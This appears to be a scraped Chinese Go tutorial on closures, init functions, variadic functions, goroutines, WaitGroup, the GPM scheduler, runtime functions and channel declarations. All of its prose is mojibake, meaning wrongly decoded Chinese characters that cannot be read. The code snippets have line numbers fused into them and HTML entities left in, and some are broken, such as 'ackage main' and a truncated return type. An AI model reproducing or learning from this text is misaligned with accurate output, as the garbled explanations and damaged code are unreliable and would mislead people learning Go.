å¯èƒ½ä¼šå¶å°”é‡åˆ°æ²¡æœ‰å‡½æ•°ä½“çš„å‡½æ•°å£°æ˜ï¼Œè¿™è¡¨ç¤ºè¯¥å‡½æ•°ä¸æ˜¯ä»¥Goå®ç°çš„ã€‚è¿™æ ·çš„å£°æ˜å®šä¹‰äº†å‡½æ•°æ ‡è¯†ç¬¦ã€‚ 12package mathfunc Sin(x float64) float //implemented in assembly language åŒ¿åå‡½æ•°1234func main() &#123;\tfunc(a, b int) &#123; fmt.Println(a + b)\t&#125;(1, 2) åˆå§‹åŒ–å‡½æ•°123func init() &#123;\tfmt.Println(123)&#125; Init å‡½æ•°åœ¨ main å‡½æ•°æ‰§è¡Œä¹‹å‰æ‰§è¡Œï¼Œå¯å®šä¹‰å¤šä¸ª init å‡½æ•°ï¼ŒæŒ‰é¡ºåºä¾æ¬¡æ‰§è¡Œ å¯å˜å‚æ•°å‡½æ•°1234567func add(nums ...int) int &#123;\ttotal := 0\tfor _, v := range nums &#123; total += v\t&#125;\treturn total&#125; å‡½æ•°é—­åŒ…12345678910111213141516171819202122232425262728ackage mainimport ( &quot;fmt&quot;)func a() func() int &#123; i := 0 b := func() int &#123; i++ fmt.Println(i) return i &#125; return b&#125;func main() &#123; c := a() c() c() c() a() //ä¸ä¼šè¾“å‡ºi&#125; 1 2 3 é—­åŒ…å¤åˆ¶çš„æ˜¯åŸå¯¹è±¡æŒ‡é’ˆï¼Œè¿™å°±å¾ˆå®¹æ˜“è§£é‡Šå»¶è¿Ÿå¼•ç”¨ç°è±¡ã€‚ 1234567891011121314151617package mainimport &quot;fmt&quot;func test() func() &#123; x := 100 fmt.Printf(&quot;x (%p) = %d &quot;, &amp;x, x) return func() &#123; fmt.Printf(&quot;x (%p) = %d &quot;, &amp;x, x) &#125;&#125;func main() &#123; f := test() f()&#125; è¾“å‡º: 12x (0xc42007c008) = 100x (0xc42007c008) = 100 åœ¨æ±‡ç¼–å±‚ ï¼Œtest å®é™…è¿”å›çš„æ˜¯ FuncVal å¯¹è±¡ï¼Œå…¶ä¸­åŒ…å«äº†åŒ¿åå‡½æ•°åœ°å€ã€é—­åŒ…å¯¹è±¡æŒ‡é’ˆã€‚å½“è°ƒ åŒ¿åå‡½æ•°æ—¶ï¼Œåªéœ€ä»¥æŸä¸ªå¯„å­˜å™¨ä¼ é€’è¯¥å¯¹è±¡å³å¯ã€‚ è¯¾åä½œä¸š &#x3D;&#x3D;&#x3D;&#x3D;ã€‹Base64 ç¼–ç è§£ç å®ç°è¿™é‡Œç¼–ç è§£ç å‡½æ•°ç›´æ¥ç”¨ dongle ä¸€ä¸ªè½»é‡çº§ã€è¯­ä¹‰åŒ–ã€å¯¹å¼€å‘è€…å‹å¥½çš„ golang ç¼–ç è§£ç ã€åŠ å¯†è§£å¯†å’Œç­¾åéªŒç­¾åº“ è¿™è¾¹æˆ‘ä»¬é€‰æ‹©ç”¨ go mod å¯¹å¯¼å…¥ dongle åº“ go mod init é¡¹ç›®ç›®å½• 1232. ```shell go get -u github.com/golang-module/dongle Base64 ç¼–ç è§£ç  12dongle.Encode.FromString(text).ByBase64().ToString()dongle.Decode.FromString(cipher).ByBase64().ToString() å¹¶å‘ä»‹ç»è¿›ç¨‹å’Œçº¿ç¨‹123A. è¿›ç¨‹æ˜¯ç¨‹åºåœ¨æ“ä½œç³»ç»Ÿä¸­çš„ä¸€æ¬¡æ‰§è¡Œè¿‡ç¨‹ï¼Œç³»ç»Ÿè¿›è¡Œèµ„æºåˆ†é…å’Œè°ƒåº¦çš„ä¸€ä¸ªç‹¬ç«‹å•ä½ã€‚B. çº¿ç¨‹æ˜¯è¿›ç¨‹çš„ä¸€ä¸ªæ‰§è¡Œå®ä½“,æ˜¯CPUè°ƒåº¦å’Œåˆ†æ´¾çš„åŸºæœ¬å•ä½,å®ƒæ˜¯æ¯”è¿›ç¨‹æ›´å°çš„èƒ½ç‹¬ç«‹è¿è¡Œçš„åŸºæœ¬å•ä½ã€‚C. ä¸€ä¸ªè¿›ç¨‹å¯ä»¥åˆ›å»ºå’Œæ’¤é”€å¤šä¸ªçº¿ç¨‹;åŒä¸€ä¸ªè¿›ç¨‹ä¸­çš„å¤šä¸ªçº¿ç¨‹ä¹‹é—´å¯ä»¥å¹¶å‘æ‰§è¡Œã€‚ å¹¶å‘å’Œå¹¶è¡Œ12A. å¤šçº¿ç¨‹ç¨‹åºåœ¨ä¸€ä¸ªæ ¸çš„cpuä¸Šè¿è¡Œï¼Œå°±æ˜¯å¹¶å‘ã€‚ B. å¤šçº¿ç¨‹ç¨‹åºåœ¨å¤šä¸ªæ ¸çš„cpuä¸Šè¿è¡Œï¼Œå°±æ˜¯å¹¶è¡Œã€‚ å¹¶å‘ å¹¶è¡Œ åç¨‹å’Œçº¿ç¨‹12åç¨‹ï¼šç‹¬ç«‹çš„æ ˆç©ºé—´ï¼Œå…±äº«å †ç©ºé—´ï¼Œè°ƒåº¦ç”±ç”¨æˆ·è‡ªå·±æ§åˆ¶ï¼Œæœ¬è´¨ä¸Šæœ‰ç‚¹ç±»ä¼¼äºç”¨æˆ·çº§çº¿ç¨‹ï¼Œè¿™äº›ç”¨æˆ·çº§çº¿ç¨‹çš„è°ƒåº¦ä¹Ÿæ˜¯è‡ªå·±å®ç°çš„ã€‚çº¿ç¨‹ï¼šä¸€ä¸ªçº¿ç¨‹ä¸Šå¯ä»¥è·‘å¤šä¸ªåç¨‹ï¼Œåç¨‹æ˜¯è½»é‡çº§çš„çº¿ç¨‹ã€‚ goroutine åªæ˜¯ç”±å®˜æ–¹å®ç°çš„è¶…çº§â€çº¿ç¨‹æ± â€ã€‚æ¯ä¸ªå®åŠ›4~5KBçš„æ ˆå†…å­˜å ç”¨å’Œç”±äºå®ç°æœºåˆ¶è€Œå¤§å¹…å‡å°‘çš„åˆ›å»ºå’Œé”€æ¯å¼€é”€æ˜¯goé«˜å¹¶å‘çš„æ ¹æœ¬åŸå› ã€‚ å¹¶å‘ä¸æ˜¯å¹¶è¡Œï¼šå¹¶å‘ä¸»è¦ç”±åˆ‡æ¢æ—¶é—´ç‰‡æ¥å®ç°â€åŒæ—¶â€è¿è¡Œï¼Œå¹¶è¡Œåˆ™æ˜¯ç›´æ¥åˆ©ç”¨å¤šæ ¸å®ç°å¤šçº¿ç¨‹çš„è¿è¡Œï¼Œgoå¯ä»¥è®¾ç½®ä½¿ç”¨æ ¸æ•°ï¼Œä»¥å‘æŒ¥å¤šæ ¸è®¡ç®—æœºçš„èƒ½åŠ›ã€‚ goroutine å¥‰è¡Œé€šè¿‡é€šä¿¡æ¥å…±äº«å†…å­˜ï¼Œè€Œä¸æ˜¯å…±äº«å†…å­˜æ¥é€šä¿¡ã€‚Goroutineåœ¨java&#x2F;c++ä¸­æˆ‘ä»¬è¦å®ç°å¹¶å‘ç¼–ç¨‹çš„æ—¶å€™ï¼Œæˆ‘ä»¬é€šå¸¸éœ€è¦è‡ªå·±ç»´æŠ¤ä¸€ä¸ªçº¿ç¨‹æ± ï¼Œå¹¶ä¸”éœ€è¦è‡ªå·±å»åŒ…è£…ä¸€ä¸ªåˆä¸€ä¸ªçš„ä»»åŠ¡ï¼ŒåŒæ—¶éœ€è¦è‡ªå·±å»è°ƒåº¦çº¿ç¨‹æ‰§è¡Œä»»åŠ¡å¹¶ç»´æŠ¤ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œè¿™ä¸€åˆ‡é€šå¸¸ä¼šè€—è´¹ç¨‹åºå‘˜å¤§é‡çš„å¿ƒæ™ºã€‚é‚£ä¹ˆèƒ½ä¸èƒ½æœ‰ä¸€ç§æœºåˆ¶ï¼Œç¨‹åºå‘˜åªéœ€è¦å®šä¹‰å¾ˆå¤šä¸ªä»»åŠ¡ï¼Œè®©ç³»ç»Ÿå»å¸®åŠ©æˆ‘ä»¬æŠŠè¿™äº›ä»»åŠ¡åˆ†é…åˆ°CPUä¸Šå®ç°å¹¶å‘æ‰§è¡Œå‘¢ï¼Ÿ Goè¯­è¨€ä¸­çš„goroutineå°±æ˜¯è¿™æ ·ä¸€ç§æœºåˆ¶ï¼Œgoroutineçš„æ¦‚å¿µç±»ä¼¼äºçº¿ç¨‹ï¼Œä½† goroutineæ˜¯ç”±Goçš„è¿è¡Œæ—¶ï¼ˆruntimeï¼‰è°ƒåº¦å’Œç®¡ç†çš„ã€‚Goç¨‹åºä¼šæ™ºèƒ½åœ°å°† goroutine ä¸­çš„ä»»åŠ¡åˆç†åœ°åˆ†é…ç»™æ¯ä¸ªCPUã€‚Goè¯­è¨€ä¹‹æ‰€ä»¥è¢«ç§°ä¸ºç°ä»£åŒ–çš„ç¼–ç¨‹è¯­è¨€ï¼Œå°±æ˜¯å› ä¸ºå®ƒåœ¨è¯­è¨€å±‚é¢å·²ç»å†…ç½®äº†è°ƒåº¦å’Œä¸Šä¸‹æ–‡åˆ‡æ¢çš„æœºåˆ¶ã€‚ åœ¨Goè¯­è¨€ç¼–ç¨‹ä¸­ä½ ä¸éœ€è¦å»è‡ªå·±å†™è¿›ç¨‹ã€çº¿ç¨‹ã€åç¨‹ï¼Œä½ çš„æŠ€èƒ½åŒ…é‡Œåªæœ‰ä¸€ä¸ªæŠ€èƒ½â€“goroutineï¼Œå½“ä½ éœ€è¦è®©æŸä¸ªä»»åŠ¡å¹¶å‘æ‰§è¡Œçš„æ—¶å€™ï¼Œä½ åªéœ€è¦æŠŠè¿™ä¸ªä»»åŠ¡åŒ…è£…æˆä¸€ä¸ªå‡½æ•°ï¼Œå¼€å¯ä¸€ä¸ªgoroutineå»æ‰§è¡Œè¿™ä¸ªå‡½æ•°å°±å¯ä»¥äº†ï¼Œå°±æ˜¯è¿™ä¹ˆç®€å•ç²—æš´ã€‚ ä½¿ç”¨goroutineGoè¯­è¨€ä¸­ä½¿ç”¨goroutineéå¸¸ç®€å•ï¼Œåªéœ€è¦åœ¨è°ƒç”¨å‡½æ•°çš„æ—¶å€™åœ¨å‰é¢åŠ ä¸Šgoå…³é”®å­—ï¼Œå°±å¯ä»¥ä¸ºä¸€ä¸ªå‡½æ•°åˆ›å»ºä¸€ä¸ªgoroutineã€‚ ä¸€ä¸ªgoroutineå¿…å®šå¯¹åº”ä¸€ä¸ªå‡½æ•°ï¼Œå¯ä»¥åˆ›å»ºå¤šä¸ªgoroutineå»æ‰§è¡Œç›¸åŒçš„å‡½æ•°ã€‚ å¯åŠ¨å•ä¸ªgoroutineå¯åŠ¨goroutineçš„æ–¹å¼éå¸¸ç®€å•ï¼Œåªéœ€è¦åœ¨è°ƒç”¨çš„å‡½æ•°ï¼ˆæ™®é€šå‡½æ•°å’ŒåŒ¿åå‡½æ•°ï¼‰å‰é¢åŠ ä¸Šä¸€ä¸ªgoå…³é”®å­—ã€‚ 1234567func hello() &#123;\tfmt.Println(&quot;Hello World&quot;)&#125;func main() &#123;\tgo hello()\tfmt.Println(&quot;Hello World in main&quot;)&#125; å‘ç° hello å‡½æ•°å¥½åƒæ²¡æœ‰æ‰§è¡Œï¼Œåœ¨ç¨‹åºå¯åŠ¨æ—¶ï¼ŒGoç¨‹åºå°±ä¼šä¸ºmain()å‡½æ•°åˆ›å»ºä¸€ä¸ªé»˜è®¤çš„goroutineã€‚ å½“main()å‡½æ•°è¿”å›çš„æ—¶å€™è¯¥goroutineå°±ç»“æŸäº†ï¼Œæ‰€æœ‰åœ¨main()å‡½æ•°ä¸­å¯åŠ¨çš„goroutineä¼šä¸€åŒç»“æŸï¼Œmainå‡½æ•°æ‰€åœ¨çš„goroutineå°±åƒæ˜¯æƒåˆ©çš„æ¸¸æˆä¸­çš„å¤œç‹ï¼Œå…¶ä»–çš„goroutineéƒ½æ˜¯å¼‚é¬¼ï¼Œå¤œç‹ä¸€æ­»å®ƒè½¬åŒ–çš„é‚£äº›å¼‚é¬¼ä¹Ÿå°±å…¨éƒ¨GGäº†ã€‚ æ‰€ä»¥æˆ‘ä»¬è¦æƒ³åŠæ³•è®©mainå‡½æ•°ç­‰ä¸€ç­‰helloå‡½æ•°ï¼Œæœ€ç®€å•ç²—æš´çš„æ–¹å¼å°±æ˜¯time.Sleepäº†ã€‚ 1time.Sleep(time.Second) é¦–å…ˆä¸ºä»€ä¹ˆä¼šå…ˆæ‰“å°Hello World in mainæ˜¯å› ä¸ºæˆ‘ä»¬åœ¨åˆ›å»ºæ–°çš„goroutineçš„æ—¶å€™éœ€è¦èŠ±è´¹ä¸€äº›æ—¶é—´ï¼Œè€Œæ­¤æ—¶mainå‡½æ•°æ‰€åœ¨çš„goroutineæ˜¯ç»§ç»­æ‰§è¡Œçš„ã€‚ å¯åŠ¨å¤šä¸ªgoroutineåœ¨Goè¯­è¨€ä¸­å®ç°å¹¶å‘å°±æ˜¯è¿™æ ·ç®€å•ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å¯åŠ¨å¤šä¸ªgoroutineã€‚è®©æˆ‘ä»¬å†æ¥ä¸€ä¸ªä¾‹å­ï¼š ï¼ˆè¿™é‡Œä½¿ç”¨äº†sync.WaitGroupæ¥å®ç°goroutineçš„åŒæ­¥ï¼‰ 123456789101112131415161718192021package mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)var wg sync.WaitGroupfunc hello(i int) &#123;\tdefer wg.Done() // goroutineç»“æŸå°±ç™»è®°-1\tfmt.Println(&quot;Hello World&quot;)&#125;func main() &#123;\tfor i := 0; i &lt; 10; i++ &#123; wg.Add(1) // å¯åŠ¨ä¸€ä¸ªgoroutineå°±ç™»è®°+1 go hello(i) &#125; wg.Wait() // ç­‰å¾…æ‰€æœ‰ç™»è®°çš„goroutineéƒ½ç»“æŸ\tfmt.Println(&quot;Hello World in main&quot;)&#125; å¤šæ¬¡æ‰§è¡Œä¸Šé¢çš„ä»£ç ï¼Œä¼šå‘ç°æ¯æ¬¡æ‰“å°çš„æ•°å­—çš„é¡ºåºéƒ½ä¸ä¸€è‡´ã€‚è¿™æ˜¯å› ä¸º10ä¸ªgoroutineæ˜¯å¹¶å‘æ‰§è¡Œçš„ï¼Œè€Œgoroutineçš„è°ƒåº¦æ˜¯éšæœºçš„ã€‚ âš ï¸æ³¨æ„ å¦‚æœä¸»åç¨‹é€€å‡ºäº†ï¼Œå…¶ä»–ä»»åŠ¡è¿˜æ‰§è¡Œå—ï¼ˆè¿è¡Œä¸‹é¢çš„ä»£ç æµ‹è¯•ä¸€ä¸‹å§ï¼‰ 123456789101112131415161718192021222324252627package mainimport ( &quot;fmt&quot; &quot;time&quot;)func main() &#123; // åˆèµ·æ¥å†™ go func() &#123; i := 0 for &#123; i++ fmt.Printf(&quot;new goroutine: i = %d &quot;, i) time.Sleep(time.Second) &#125; &#125;() i := 0 for &#123; i++ fmt.Printf(&quot;main goroutine: i = %d &quot;, i) time.Sleep(time.Second) if i == 2 &#123; break &#125; &#125;&#125; 1234main goroutine: i = 1new goroutine: i = 1new goroutine: i = 2main goroutine: i = 2 goroutineä¸çº¿ç¨‹å¯å¢é•¿çš„æ ˆ OSçº¿ç¨‹ï¼ˆæ“ä½œç³»ç»Ÿçº¿ç¨‹ï¼‰ä¸€èˆ¬éƒ½æœ‰å›ºå®šçš„æ ˆå†…å­˜ï¼ˆé€šå¸¸ä¸º2MBï¼‰,ä¸€ä¸ªgoroutineçš„æ ˆåœ¨å…¶ç”Ÿå‘½å‘¨æœŸå¼€å§‹æ—¶åªæœ‰å¾ˆå°çš„æ ˆï¼ˆå…¸å‹æƒ…å†µä¸‹2KBï¼‰ï¼Œgoroutineçš„æ ˆä¸æ˜¯å›ºå®šçš„ï¼Œä»–å¯ä»¥æŒ‰éœ€å¢å¤§å’Œç¼©å°ï¼Œgoroutineçš„æ ˆå¤§å°é™åˆ¶å¯ä»¥è¾¾åˆ°1GBï¼Œè™½ç„¶æå°‘ä¼šç”¨åˆ°è¿™ä¸ªå¤§ã€‚æ‰€ä»¥åœ¨Goè¯­è¨€ä¸­ä¸€æ¬¡åˆ›å»ºåä¸‡å·¦å³çš„goroutineä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ goroutineè°ƒåº¦GPMæ˜¯Goè¯­è¨€è¿è¡Œæ—¶ï¼ˆruntimeï¼‰å±‚é¢çš„å®ç°ï¼Œæ˜¯goè¯­è¨€è‡ªå·±å®ç°çš„ä¸€å¥—è°ƒåº¦ç³»ç»Ÿã€‚åŒºåˆ«äºæ“ä½œç³»ç»Ÿè°ƒåº¦OSçº¿ç¨‹ã€‚ 1.Gå¾ˆå¥½ç†è§£ï¼Œå°±æ˜¯ä¸ªgoroutineçš„ï¼Œé‡Œé¢é™¤äº†å­˜æ”¾æœ¬goroutineä¿¡æ¯å¤– è¿˜æœ‰ä¸æ‰€åœ¨Pçš„ç»‘å®šç­‰ä¿¡æ¯ã€‚ 2.Pç®¡ç†ç€ä¸€ç»„goroutineé˜Ÿåˆ—ï¼ŒPé‡Œé¢ä¼šå­˜å‚¨å½“å‰goroutineè¿è¡Œçš„ä¸Šä¸‹æ–‡ç¯å¢ƒï¼ˆå‡½æ•°æŒ‡é’ˆï¼Œå †æ ˆåœ°å€åŠåœ°å€è¾¹ç•Œï¼‰ï¼ŒPä¼šå¯¹è‡ªå·±ç®¡ç†çš„goroutineé˜Ÿåˆ—åšä¸€äº›è°ƒåº¦ï¼ˆæ¯”å¦‚æŠŠå ç”¨CPUæ—¶é—´è¾ƒé•¿çš„goroutineæš‚åœã€è¿è¡Œåç»­çš„goroutineç­‰ç­‰ï¼‰å½“è‡ªå·±çš„é˜Ÿåˆ—æ¶ˆè´¹å®Œäº†å°±å»å…¨å±€é˜Ÿåˆ—é‡Œå–ï¼Œå¦‚æœå…¨å±€é˜Ÿåˆ—é‡Œä¹Ÿæ¶ˆè´¹å®Œäº†ä¼šå»å…¶ä»–Pçš„é˜Ÿåˆ—é‡ŒæŠ¢ä»»åŠ¡ã€‚ 3.Mï¼ˆmachineï¼‰æ˜¯Goè¿è¡Œæ—¶ï¼ˆruntimeï¼‰å¯¹æ“ä½œç³»ç»Ÿå†…æ ¸çº¿ç¨‹çš„è™šæ‹Ÿï¼Œ Mä¸å†…æ ¸çº¿ç¨‹ä¸€èˆ¬æ˜¯ä¸€ä¸€æ˜ å°„çš„å…³ç³»ï¼Œ ä¸€ä¸ªgroutineæœ€ç»ˆæ˜¯è¦æ”¾åˆ°Mä¸Šæ‰§è¡Œçš„ï¼› Pä¸Mä¸€èˆ¬ä¹Ÿæ˜¯ä¸€ä¸€å¯¹åº”çš„ã€‚ä»–ä»¬å…³ç³»æ˜¯ï¼š Pç®¡ç†ç€ä¸€ç»„GæŒ‚è½½åœ¨Mä¸Šè¿è¡Œã€‚å½“ä¸€ä¸ªGé•¿ä¹…é˜»å¡åœ¨ä¸€ä¸ªMä¸Šæ—¶ï¼Œruntimeä¼šæ–°å»ºä¸€ä¸ªMï¼Œé˜»å¡Gæ‰€åœ¨çš„Pä¼šæŠŠå…¶ä»–çš„G æŒ‚è½½åœ¨æ–°å»ºçš„Mä¸Šã€‚å½“æ—§çš„Gé˜»å¡å®Œæˆæˆ–è€…è®¤ä¸ºå…¶å·²ç»æ­»æ‰æ—¶ å›æ”¶æ—§çš„Mã€‚ Pçš„ä¸ªæ•°æ˜¯é€šè¿‡runtime.GOMAXPROCSè®¾å®šï¼ˆæœ€å¤§256ï¼‰ï¼ŒGo1.5ç‰ˆæœ¬ä¹‹åé»˜è®¤ä¸ºç‰©ç†çº¿ç¨‹æ•°ã€‚ åœ¨å¹¶å‘é‡å¤§çš„æ—¶å€™ä¼šå¢åŠ ä¸€äº›På’ŒMï¼Œä½†ä¸ä¼šå¤ªå¤šï¼Œåˆ‡æ¢å¤ªé¢‘ç¹çš„è¯å¾—ä¸å¿å¤±ã€‚ å•ä»çº¿ç¨‹è°ƒåº¦è®²ï¼ŒGoè¯­è¨€ç›¸æ¯”èµ·å…¶ä»–è¯­è¨€çš„ä¼˜åŠ¿åœ¨äºOSçº¿ç¨‹æ˜¯ç”±OSå†…æ ¸æ¥è°ƒåº¦çš„ï¼Œgoroutineåˆ™æ˜¯ç”±Goè¿è¡Œæ—¶ï¼ˆruntimeï¼‰è‡ªå·±çš„è°ƒåº¦å™¨è°ƒåº¦çš„ï¼Œè¿™ä¸ªè°ƒåº¦å™¨ä½¿ç”¨ä¸€ä¸ªç§°ä¸ºm:nè°ƒåº¦çš„æŠ€æœ¯ï¼ˆå¤ç”¨&#x2F;è°ƒåº¦mä¸ªgoroutineåˆ°nä¸ªOSçº¿ç¨‹ï¼‰ã€‚ å…¶ä¸€å¤§ç‰¹ç‚¹æ˜¯goroutineçš„è°ƒåº¦æ˜¯åœ¨ç”¨æˆ·æ€ä¸‹å®Œæˆçš„ï¼Œ ä¸æ¶‰åŠå†…æ ¸æ€ä¸ç”¨æˆ·æ€ä¹‹é—´çš„é¢‘ç¹åˆ‡æ¢ï¼ŒåŒ…æ‹¬å†…å­˜çš„åˆ†é…ä¸é‡Šæ”¾ï¼Œéƒ½æ˜¯åœ¨ç”¨æˆ·æ€ç»´æŠ¤ç€ä¸€å—å¤§çš„å†…å­˜æ± ï¼Œ ä¸ç›´æ¥è°ƒç”¨ç³»ç»Ÿçš„mallocå‡½æ•°ï¼ˆé™¤éå†…å­˜æ± éœ€è¦æ”¹å˜ï¼‰ï¼Œæˆæœ¬æ¯”è°ƒåº¦OSçº¿ç¨‹ä½å¾ˆå¤šã€‚ å¦ä¸€æ–¹é¢å……åˆ†åˆ©ç”¨äº†å¤šæ ¸çš„ç¡¬ä»¶èµ„æºï¼Œè¿‘ä¼¼çš„æŠŠè‹¥å¹²goroutineå‡åˆ†åœ¨ç‰©ç†çº¿ç¨‹ä¸Šï¼Œ å†åŠ ä¸Šæœ¬èº«goroutineçš„è¶…è½»é‡ï¼Œä»¥ä¸Šç§ç§ä¿è¯äº†goè°ƒåº¦æ–¹é¢çš„æ€§èƒ½ã€‚ runtimeåŒ…runtime.Gosched()è®©å‡ºCPUæ—¶é—´ç‰‡ï¼Œé‡æ–°ç­‰å¾…å®‰æ’ä»»åŠ¡(å¤§æ¦‚æ„æ€å°±æ˜¯æœ¬æ¥è®¡åˆ’çš„å¥½å¥½çš„å‘¨æœ«å‡ºå»çƒ§çƒ¤ï¼Œä½†æ˜¯ä½ å¦ˆè®©ä½ å»ç›¸äº²,ä¸¤ç§æƒ…å†µç¬¬ä¸€å°±æ˜¯ä½ ç›¸äº²é€Ÿåº¦éå¸¸å¿«ï¼Œè§é¢å°±é»„ä¸è€½è¯¯ä½ ç»§ç»­çƒ§çƒ¤ï¼Œç¬¬äºŒç§æƒ…å†µå°±æ˜¯ä½ ç›¸äº²é€Ÿåº¦ç‰¹åˆ«æ…¢ï¼Œè§é¢å°±æ˜¯ä½ ä¾¬æˆ‘ä¾¬çš„ï¼Œè€½è¯¯äº†çƒ§çƒ¤ï¼Œä½†æ˜¯è¿˜é¦‹å°±æ˜¯è€½è¯¯äº†çƒ§çƒ¤ä½ è¿˜å¾—å»çƒ§çƒ¤) 12345678910111213141516171819202122package mainimport (\t&quot;fmt&quot;\t&quot;runtime&quot;)func main() &#123;\t// åç¨‹\tgo func(s string) &#123; for i := 0; i &lt; 2; i++ &#123; fmt.Println(s) &#125;\t&#125;(&quot;Hello&quot;)\t// ä¸»åç¨‹\tfor i := 0; i &lt; 2; i++ &#123; // åˆ‡ä¸€ä¸‹ï¼Œå†åˆ†é…ä»»åŠ¡ runtime.Gosched() fmt.Println(&quot;hello&quot;)\t&#125;&#125; runtime.Goexit()é€€å‡ºå½“å‰åç¨‹(ä¸€è¾¹çƒ§çƒ¤ä¸€è¾¹ç›¸äº²ï¼Œçªç„¶å‘ç°ç›¸äº²å¯¹è±¡å¤ªä¸‘å½±å“çƒ§çƒ¤ï¼Œæœæ–­è®©å¥¹æ»šè›‹ï¼Œç„¶åä¹Ÿå°±æ²¡æœ‰ç„¶åäº†) 12345678910111213141516171819202122package mainimport ( &quot;fmt&quot; &quot;runtime&quot;)func main() &#123; go func() &#123; defer fmt.Println(&quot;A.defer&quot;) func() &#123; defer fmt.Println(&quot;B.defer&quot;) // ç»“æŸåç¨‹ runtime.Goexit() defer fmt.Println(&quot;C.defer&quot;) fmt.Println(&quot;B&quot;) &#125;() fmt.Println(&quot;A&quot;) &#125;() for &#123; &#125;&#125; runtime.GOMAXPROCSGoè¿è¡Œæ—¶çš„è°ƒåº¦å™¨ä½¿ç”¨GOMAXPROCSå‚æ•°æ¥ç¡®å®šéœ€è¦ä½¿ç”¨å¤šå°‘ä¸ªOSçº¿ç¨‹æ¥åŒæ—¶æ‰§è¡ŒGoä»£ç ã€‚é»˜è®¤å€¼æ˜¯æœºå™¨ä¸Šçš„CPUæ ¸å¿ƒæ•°ã€‚ä¾‹å¦‚åœ¨ä¸€ä¸ª8æ ¸å¿ƒçš„æœºå™¨ä¸Šï¼Œè°ƒåº¦å™¨ä¼šæŠŠGoä»£ç åŒæ—¶è°ƒåº¦åˆ°8ä¸ªOSçº¿ç¨‹ä¸Šï¼ˆGOMAXPROCSæ˜¯m:nè°ƒåº¦ä¸­çš„nï¼‰ã€‚ Goè¯­è¨€ä¸­å¯ä»¥é€šè¿‡runtime.GOMAXPROCS()å‡½æ•°è®¾ç½®å½“å‰ç¨‹åºå¹¶å‘æ—¶å ç”¨çš„CPUé€»è¾‘æ ¸å¿ƒæ•°ã€‚ Go1.5ç‰ˆæœ¬ä¹‹å‰ï¼Œé»˜è®¤ä½¿ç”¨çš„æ˜¯å•æ ¸å¿ƒæ‰§è¡Œã€‚Go1.5ç‰ˆæœ¬ä¹‹åï¼Œé»˜è®¤ä½¿ç”¨å…¨éƒ¨çš„CPUé€»è¾‘æ ¸å¿ƒæ•°ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡å°†ä»»åŠ¡åˆ†é…åˆ°ä¸åŒçš„CPUé€»è¾‘æ ¸å¿ƒä¸Šå®ç°å¹¶è¡Œçš„æ•ˆæœï¼Œè¿™é‡Œä¸¾ä¸ªä¾‹å­ï¼š Goè¯­è¨€ä¸­çš„æ“ä½œç³»ç»Ÿçº¿ç¨‹å’Œgoroutineçš„å…³ç³»ï¼š 1.ä¸€ä¸ªæ“ä½œç³»ç»Ÿçº¿ç¨‹å¯¹åº”ç”¨æˆ·æ€å¤šä¸ªgoroutineã€‚ 2.goç¨‹åºå¯ä»¥åŒæ—¶ä½¿ç”¨å¤šä¸ªæ“ä½œç³»ç»Ÿçº¿ç¨‹ã€‚ 3.goroutineå’ŒOSçº¿ç¨‹æ˜¯å¤šå¯¹å¤šçš„å…³ç³»ï¼Œå³m:nã€‚ Channelå•çº¯åœ°å°†å‡½æ•°å¹¶å‘æ‰§è¡Œæ˜¯æ²¡æœ‰æ„ä¹‰çš„ã€‚å‡½æ•°ä¸å‡½æ•°é—´éœ€è¦äº¤æ¢æ•°æ®æ‰èƒ½ä½“ç°å¹¶å‘æ‰§è¡Œå‡½æ•°çš„æ„ä¹‰ã€‚ è™½ç„¶å¯ä»¥ä½¿ç”¨å…±äº«å†…å­˜è¿›è¡Œæ•°æ®äº¤æ¢ï¼Œä½†æ˜¯å…±äº«å†…å­˜åœ¨ä¸åŒçš„goroutineä¸­å®¹æ˜“å‘ç”Ÿç«æ€é—®é¢˜ã€‚ä¸ºäº†ä¿è¯æ•°æ®äº¤æ¢çš„æ­£ç¡®æ€§ï¼Œå¿…é¡»ä½¿ç”¨äº’æ–¥é‡å¯¹å†…å­˜è¿›è¡ŒåŠ é”ï¼Œè¿™ç§åšæ³•åŠ¿å¿…é€ æˆæ€§èƒ½é—®é¢˜ã€‚ Goè¯­è¨€çš„å¹¶å‘æ¨¡å‹æ˜¯CSPï¼ˆCommunicating Sequential Processesï¼‰ï¼Œæå€¡é€šè¿‡é€šä¿¡å…±äº«å†…å­˜è€Œä¸æ˜¯é€šè¿‡å…±äº«å†…å­˜è€Œå®ç°é€šä¿¡ã€‚ å¦‚æœè¯´goroutineæ˜¯Goç¨‹åºå¹¶å‘çš„æ‰§è¡Œä½“ï¼Œchannelå°±æ˜¯å®ƒä»¬ä¹‹é—´çš„è¿æ¥ã€‚channelæ˜¯å¯ä»¥è®©ä¸€ä¸ªgoroutineå‘é€ç‰¹å®šå€¼åˆ°å¦ä¸€ä¸ªgoroutineçš„é€šä¿¡æœºåˆ¶ã€‚ Go è¯­è¨€ä¸­çš„é€šé“ï¼ˆchannelï¼‰æ˜¯ä¸€ç§ç‰¹æ®Šçš„ç±»å‹ã€‚é€šé“åƒä¸€ä¸ªä¼ é€å¸¦æˆ–è€…é˜Ÿåˆ—ï¼Œæ€»æ˜¯éµå¾ªå…ˆå…¥å…ˆå‡ºï¼ˆFirst In First Outï¼‰çš„è§„åˆ™ï¼Œä¿è¯æ”¶å‘æ•°æ®çš„é¡ºåºã€‚æ¯ä¸€ä¸ªé€šé“éƒ½æ˜¯ä¸€ä¸ªå…·ä½“ç±»å‹çš„å¯¼ç®¡ï¼Œä¹Ÿå°±æ˜¯å£°æ˜channelçš„æ—¶å€™éœ€è¦ä¸ºå…¶æŒ‡å®šå…ƒç´ ç±»å‹ã€‚ channelç±»å‹channelæ˜¯ä¸€ç§ç±»å‹ï¼Œä¸€ç§å¼•ç”¨ç±»å‹ã€‚å£°æ˜é€šé“ç±»å‹çš„æ ¼å¼å¦‚ä¸‹ï¼š 1234 var å˜é‡ chan å…ƒç´ ç±»å‹var ch1 chan int // å£°æ˜ä¸€ä¸ªä¼ é€’æ•´å‹çš„é€šé“ var ch2 chan bool // å£°æ˜ä¸€ä¸ªä¼ é€’å¸ƒå°”å‹çš„é€šé“ var ch3 chan []int // å£°æ˜ä¸€ä¸ªä¼ é€’intåˆ‡ç‰‡çš„é€šé“ 